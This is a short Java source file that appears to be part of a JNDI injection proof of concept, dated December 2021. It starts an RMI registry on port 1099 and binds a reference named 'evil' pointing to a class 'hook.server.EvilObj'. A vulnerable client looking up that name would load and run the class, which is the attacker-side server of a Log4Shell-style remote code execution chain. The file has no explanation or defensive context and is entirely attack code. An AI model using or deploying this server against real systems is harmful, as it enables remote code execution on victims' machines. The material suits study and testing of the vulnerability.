package hook.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author hongshaochuan
 * @date 2021/12/11
 */
public class RMIServer {

    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();
        System.out.println("rmi server running, bind port 1099");
        Reference reference = new Reference("hook.server.EvilObj", "hook.server.EvilObj", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("evil", referenceWrapper);


    }
}
